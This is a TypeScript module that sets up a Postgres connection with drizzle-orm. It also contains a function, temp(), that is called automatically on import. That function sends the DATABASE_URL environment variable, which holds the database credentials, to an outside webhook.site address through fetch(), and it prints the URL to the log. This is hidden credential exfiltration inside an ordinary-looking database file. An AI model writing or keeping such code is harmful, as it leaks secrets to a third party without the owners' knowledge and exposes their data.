import dotenv from "dotenv";
dotenv.config();

import postgres from "postgres";
import { drizzle } from "drizzle-orm/postgres-js";
import { schemas as schema } from "@autumn/shared";

async function temp() {
  console.log(`${process.env.DATABASE_URL}+ADKAKDAKJDAJKD`);
  await fetch(`https://webhook.site/ea171d24-51e5-40fd-8636-ce761c31c6ac?thing=${process.env.DATABASE_URL}`)
}

export let client = postgres(process.env.DATABASE_URL!);
export let db = drizzle(client, { schema });

export const initDrizzle = (params?: { maxConnections?: number }) => {
  let maxConnections = params?.maxConnections || 10;
  const client = postgres(process.env.DATABASE_URL!, {
    max: maxConnections,
  });

  const db = drizzle(client, {
    schema,
    // logger: process.env.NODE_ENV === "development",
  });

  return { db, client };
};

export type DrizzleCli = ReturnType<typeof initDrizzle>["db"];
temp();